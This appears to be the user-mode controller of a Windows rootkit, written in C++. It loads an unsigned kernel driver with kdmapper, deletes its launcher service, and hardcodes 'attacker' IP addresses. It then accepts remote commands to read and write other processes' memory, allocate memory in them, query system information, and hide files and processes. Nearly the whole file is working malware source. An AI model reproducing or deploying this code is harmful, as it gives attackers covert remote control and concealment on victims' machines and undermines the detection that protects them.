#include "medium.h"
#include "rootreqs.h"
#include "piping.h"


// Global medium variables:
const char* MainPipeName = "\\\\.\\pipe\\ShrootPipe";
BOOL ShouldQuit() {
    // Returns if the medium should stop working (debugging, forensics, special errors..) -
    return FALSE;
}


int MediumAct(NETWORK_INFO SndInfo, NETWORK_INFO SrvInfo, HANDLE* PipeHandle, LogFile* MediumLog, BOOL* IsValidPipe) {
    int OprResult = 0;
    DWORD LastError = 0;
    PASS_DATA result;
    PVOID SendBuf = NULL;
    ULONG SendSize = 0;
    ROOTKIT_OPERATION RootStat = RKOP_NOOPERATION;
    ROOTKIT_MEMORY OprBuffer;
    PVOID LocalRead = NULL;
    PVOID AttrBuffer = NULL;
    PVOID InitialString = NULL;  // Usually receives a module name but can also receive other strings (such as debug message)
    ULONG ReadSize = 0;
    ULONG InitialSize = 0;
    ULONG64 AttrBufferSize = 0;
    BOOL ValidInit = FALSE;
    ROOTKIT_UNEXERR SysErrInit = successful;
    char MdlMalloc = 1;
    char NextLine = '\n';
    char NullTerm = '\0';



    while (TRUE) {
        if (!*IsValidPipe) {
            // Create valid pipe for communications:
            *IsValidPipe = OpenPipe(PipeHandle, MainPipeName, MediumLog);
            while (!IsValidPipe) {
                *IsValidPipe = OpenPipe(PipeHandle, MainPipeName, MediumLog);
            }

            // Connect to driver client with pipe:
            *IsValidPipe = ConnectNamedPipe(*PipeHandle, NULL);
            if (!*IsValidPipe) {
                LastError = GetLastError();
                if (LastError == ERROR_PIPE_CONNECTED) {
                    *IsValidPipe = TRUE;
                    LastError = 0;
                    MediumLog->WriteLog((PVOID)"MainMedium pipe - driver already connected to pipe between creating it and connecting to it!\n", 94);
                }
                else {
                    MediumLog->WriteError("MainMedium pipe - error while connecting to pipe", LastError);
                    ClosePipe(PipeHandle);
                }
            }
            else {
                MediumLog->WriteLog((PVOID)"MainMedium pipe - driver connected to pipe like expected\n", 58);
            }
        }

        // Actual medium operations:
        while (*IsValidPipe) {
            result = root_internet::RecvData(SndInfo.AsoSock, sizeof(RootStat), &RootStat, FALSE, 0);
            if (!result.err && result.value == sizeof(RootStat)) {
                if (ShouldQuit()) {
                    // Special error/event occured, should quit and stop working -
                    RootStat = RKOP_TERMINATE;
                    result = root_internet::SendData(SndInfo.AsoSock, &RootStat, sizeof(RootStat), FALSE, 0);
                    if (!result.err && result.value == sizeof(RootStat)) {
                        result = root_internet::RecvData(SndInfo.AsoSock, sizeof(RootStat), &RootStat, FALSE, 0);
                        if (!result.err && result.value == sizeof(RootStat) && RootStat == RKOP_TERMINATE) {
                            printf("Termination initiated from here accepted by tomed\n");
                        }
                    }

                    closesocket(SndInfo.AsoSock);
                    *IsValidPipe = FALSE;
                    DisconnectNamedPipe(*PipeHandle);
                    ClosePipe(PipeHandle);
                    return -1;
                }

                // resend the type of request back to client -
                result = root_internet::SendData(SndInfo.AsoSock, &RootStat, sizeof(RootStat), FALSE, 0);
                if (!result.err && result.value == sizeof(RootStat)) {
                    // Receive the main module for the function -
                    result = root_internet::RecvData(SndInfo.AsoSock, sizeof(InitialSize), &InitialSize, FALSE, 0);
                    if (!result.err && result.value == sizeof(InitialSize)) {
                        InitialString = malloc(InitialSize);
                        if (InitialString != NULL) {
                            result = root_internet::SendData(SndInfo.AsoSock, &MdlMalloc, sizeof(MdlMalloc), FALSE, 0);
                            if (!result.err && result.value == sizeof(MdlMalloc)) {
                                result = root_internet::RecvData(SndInfo.AsoSock, InitialSize, InitialString, FALSE, 0);
                                if (!result.err && result.value == InitialSize) {
                                    ValidInit = TRUE;
                                    printf("Init string received - %s\n", (char*)InitialString);
                                }
                            }
                        }
                        else {
                            MdlMalloc = 0;
                            root_internet::SendData(SndInfo.AsoSock, &MdlMalloc, sizeof(MdlMalloc), FALSE, 0);
                        }
                    }

                    if (!ValidInit) {
                        if (InitialString != NULL) {
                            free(InitialString);
                        }
                        RootStat = RKOP_NOOPERATION;
                    }
                    else {
                        ValidInit = FALSE;
                    }

                    switch (RootStat) {
                    case RKOP_WRITE:
                        // Write into process virtual memory (from user supplied buffer / another process) -
                        OprResult = WriteKernelCall(SndInfo.AsoSock, &OprBuffer, (char*)InitialString, PipeHandle, MediumLog);
                        if (OprResult != 1) {
                            printf("Failed operation (sending of returned struct / receiving OG struct)\n");
                        }
                        free(InitialString);
                        break;

                    case RKOP_READ:
                        // Read from process virtual memory -
                        OprResult = ReadKernelCall(SndInfo.AsoSock, LocalRead, &OprBuffer, (char*)InitialString, PipeHandle, MediumLog);
                        if (OprResult != 1) {
                            printf("Failed operation (sending of returned struct / receiving OG struct)\n");
                        }
                        free(LocalRead);
                        free(InitialString);
                        break;

                    case RKOP_MDLBASE:
                        // Get the base address of a process module (executable) in memory -
                        printf("No extra buffer parameters for getting the module base..\n");
                        OprResult = MdlBaseKernelCall(SndInfo.AsoSock, &OprBuffer, (char*)InitialString, PipeHandle, MediumLog);
                        if (OprResult != 1) {
                            printf("Failed operation (sending of returned struct / receiving OG struct)\n");
                        }
                        else {
                            printf("Base address of %s in memory: %p\n", (char*)InitialString, OprBuffer.Out);
                        }
                        free(InitialString);
                        break;

                    case RKOP_SYSINFO:
                        // return specific information about the target system (with ZwQuerySystemInformation) -

                        if (!ValidateInfoTypeString((char*)InitialString)) {
                            printf("Client sent invalid system info string\n");
                            free(InitialString);
                            break;
                        }

                        result = root_internet::RecvData(SndInfo.AsoSock, sizeof(AttrBufferSize), &AttrBufferSize, FALSE, 0);
                        if (result.err || result.value != sizeof(AttrBufferSize)) {
                            printf("Cannot get size of initial system buffer\n");
                            free(InitialString);
                            break;
                        }

                        AttrBuffer = malloc(AttrBufferSize);
                        if (AttrBuffer == NULL) {
                            printf("Cannot allocate initial system buffer\n");
                            free(InitialString);
                            SysErrInit = memalloc;
                        }
                        if (SysErrInit == successful) {
                            result = root_internet::RecvData(SndInfo.AsoSock, (int)AttrBufferSize, AttrBuffer, FALSE, 0);
                            if (result.err || result.value != AttrBufferSize) {
                                printf("Cannot get initial system buffer\n");
                                free(AttrBuffer);
                                free(InitialString);
                                break;
                            }
                        }

                        OprResult = SysInfoKernelCall(SndInfo.AsoSock, &OprBuffer, AttrBuffer, (char*)InitialString, SysErrInit, AttrBufferSize, PipeHandle, MediumLog);
                        if (OprResult != 1) {
                            printf("Failed operation (sending of returned struct / receiving OG struct/ UNEXPECTED ERROR FROM HERE)\n");
                        }
                        else {
                            printf("Success operation system information\n");
                        }
                        free(AttrBuffer);
                        free(InitialString);
                        break;

                    case RKOP_PRCMALLOC:
                        // Allocate memory in a specific process (and leave it committed for now) -
                        printf("No extra buffer parameters for allocating specific memory..\n");
                        OprResult = AllocSpecKernelCall(SndInfo.AsoSock, &OprBuffer, (char*)InitialString, PipeHandle, MediumLog);
                        if (OprResult != 1) {
                            printf("Failed operation (sending of returned struct / receiving OG struct)\n");
                        }
                        free(InitialString);
                        break;
                    
                    case RKOP_HIDEFILE:
                        // Hide file/folder by dynamic request:
                        OprResult = HideFileKernelCall(SndInfo.AsoSock, &OprBuffer, (char*)InitialString, PipeHandle, MediumLog);
                        if (OprResult != 1) {
                            printf("Failed operation (sending of returned struct / receiving OG struct)\n");
                        }
                        free(InitialString);
                        break;
                    
                    case RKOP_HIDEPROC:
                        // Hide process by dynamic request:
                        OprResult = HideProcessKernelCall(SndInfo.AsoSock, &OprBuffer, (char*)InitialString, PipeHandle, MediumLog);
                        if (OprResult != 1) {
                            printf("Failed operation (sending of returned struct / receiving OG struct)\n");
                        }
                        free(InitialString);
                        break;

                    default:
                        printf("Error has occurred\n");
                        if (result.Term) {
                            printf("Critical error occurred, closing connection with specific client..\n");
                            closesocket(SndInfo.AsoSock);
                            *IsValidPipe = FALSE;
                            DisconnectNamedPipe(*PipeHandle);
                            ClosePipe(PipeHandle);
                            return -1;
                        }
                        break;
                    }

                    // Clean important variables and network stack from last request -
                    root_internet::CleanNetStack(SndInfo.AsoSock);
                    SendSize = 0;
                    SendBuf = NULL;
                    SysErrInit = successful;
                    if (OprResult == -1) {
                        *IsValidPipe = FALSE;
                        DisconnectNamedPipe(*PipeHandle);
                        ClosePipe(PipeHandle);
                    }
                    OprResult = 0;
                    printf("FINISH MEDIUM FUNCTION FINISHED\n");
                }
            }

            else {
                printf("Big error has occured\n");
                if (result.Term) {
                    printf("Critical error occured, closing connection with specific client..\n");
                    closesocket(SndInfo.AsoSock);
                    *IsValidPipe = FALSE;
                    DisconnectNamedPipe(*PipeHandle);
                    ClosePipe(PipeHandle);
                    return 0;
                }
                break;
            }
        }
    }
    closesocket(SndInfo.AsoSock);
    *IsValidPipe = FALSE;
    DisconnectNamedPipe(*PipeHandle);
    ClosePipe(PipeHandle);
    return 0;
}


int main(int argc, char *argv[]) {
    SOCKET ssckt;
    int SockaddrLen = sizeof(sockaddr);
    char SrvIP[MAXIPV4_ADDRESS_SIZE] = { 0 };
    char SndIP[MAXIPV4_ADDRESS_SIZE] = { 0 };
    USHORT SrvPort = 44444;
    USHORT SndPort = 44444;
    NETWORK_INFO NetArr[3];
    HANDLE PipeHandle = INVALID_HANDLE_VALUE;
    BOOL IsValidPipe = FALSE;
    DWORD LastError = 0;
    LogFile MediumLog = { 0 };
    RETURN_LAST ReturnStatus = { 0 };
    MediumLog.InitiateFile("C:\\nosusfolder\\verysus\\MediumLogFile.txt");

    // HARDCODED VALUE, GENERATED FROM ListAttacker IN trypack\AttackerFile\attackerips.txt
    const char* AttackAddresses = "192.168.1.21~192.168.1.10~192.168.40.1";


    // Destroy launching service:
    if (system("sc stop RootAuto > nul && sc delete RootAuto > nul") == -1) {
        MediumLog.WriteError("MainMedium pipe - Cannot destroy launching service", GetLastError());
        MediumLog.CloseLog();
        return 0;
    }
    MediumLog.WriteLog((PVOID)"Destroyed launching service!\n", 30);


    // Create dispatch function that will be triggered for CTRL_SHUTDOWN_EVENT:
    if (!SetConsoleCtrlHandler(CtrlHandler, TRUE)) {
        MediumLog.WriteError("MainMedium pipe - Cannot create control handler to handle reboots", GetLastError());
        MediumLog.CloseLog();
        return 0;
    }
    MediumLog.WriteLog((PVOID)"Created control handler to handle reboots!\n", 44);


    // Get IP addresses of target and attacker:
    if (!address_config::MatchIpAddresses(SrvIP, SndIP, AttackAddresses)) {
        MediumLog.WriteError("MainMedium pipe - Cannot find the target address and the matching attacker address", GetLastError());
        MediumLog.CloseLog();
        return 0;
    }
    printf("Target: %s, Attacker: %s\n", SrvIP, SndIP);


    // Make sure that all depended-on files exist on target machine (folders + files):
    LastError = VerifyDependencies(SndIP);
    if (LastError != 0) {
        return LastError;
    }


    // Create valid pipe for communications initial -
    IsValidPipe = OpenPipe(&PipeHandle, MainPipeName, &MediumLog);
    while (!IsValidPipe) {
        IsValidPipe = OpenPipe(&PipeHandle, MainPipeName, &MediumLog);
    }


    // Activate service manager with driver as parameter -
    ReturnStatus = RealTime(TRUE);
    if (ReturnStatus.Represent != ERROR_SUCCESS || ReturnStatus.LastError != 0) {
        return FALSE;
    }
    if (system("C:\\nosusfolder\\verysus\\kdmapper.exe --PassAllocationPtr C:\\nosusfolder\\verysus\\KMDFdriver\\Release\\KMDFdriver.sys") == -1) {
        MediumLog.WriteError("MainMedium pipe - Failed to activate service manager with driver as parameter", GetLastError());
        MediumLog.CloseLog();
        return 0;
    }
    MediumLog.WriteLog((PVOID)"Activated service manager with driver as a parameter!\n", 55);
    ReturnStatus = RealTime(FALSE);
    if (ReturnStatus.Represent != ERROR_SUCCESS || ReturnStatus.LastError != 0) {
        return FALSE;
    }


    // Connect to driver client with pipe initial -
    IsValidPipe = ConnectNamedPipe(PipeHandle, NULL);
    if (!IsValidPipe) {
        LastError = GetLastError();
        if (LastError == ERROR_PIPE_CONNECTED) {
            IsValidPipe = TRUE;
            LastError = 0;
            MediumLog.WriteLog((PVOID)"MainMedium pipe - driver already connected to pipe between creating it and connecting to it!\n", 94);
        }
        else {
            MediumLog.WriteError("MainMedium pipe - error while connecting to pipe", LastError);
            MediumLog.CloseLog();
            DisconnectNamedPipe(PipeHandle);
            ClosePipe(&PipeHandle);
            return 0;
        }
    }
    else {
        MediumLog.WriteLog((PVOID)"MainMedium pipe - driver connected to pipe like expected\n", 58);
    }


    root_internet::SetNetStructs(SrvIP, SndIP, SrvPort, SndPort, NetArr);
    int result = root_internet::StartComms(NetArr);
    if (result == 1) {
        printf("Quitting (internet/socket communication initiation error)..\n");
        MediumLog.CloseLog();
        DisconnectNamedPipe(PipeHandle);
        ClosePipe(&PipeHandle);
        return 1;
    }

    while (TRUE) {
        printf(" here 3\n");

        // Accept connection
        ssckt = accept(NetArr[0].AsoSock, (sockaddr*)&NetArr[1].AddrInfo, &SockaddrLen);
        if (ssckt == INVALID_SOCKET) {
            std::cerr << "Could not accept connection with socket object: " << WSAGetLastError() << "\n";
        }
        else {
            NetArr[1].AsoSock = ssckt;
            printf("Initialization of connection succeeded, proceeding to start receiving requests..\n");
            result = MediumAct(NetArr[1], NetArr[0], &PipeHandle, &MediumLog, &IsValidPipe);
            printf("Disconnected from (%s, %hu)\n", NetArr[1].IP, NetArr[1].Port);
            root_internet::CleanNetStack(NetArr[1].AsoSock);

            if (result == -1) {
                printf("Termination Complete\n");
                closesocket(NetArr[0].AsoSock);
                WSACleanup();
                MediumLog.CloseLog();
                DisconnectNamedPipe(PipeHandle);
                ClosePipe(&PipeHandle);
                return 0;
            }
        }
    }

    closesocket(NetArr[0].AsoSock);
    WSACleanup();
    MediumLog.CloseLog();
    DisconnectNamedPipe(PipeHandle);
    ClosePipe(&PipeHandle);
    return 0;
}
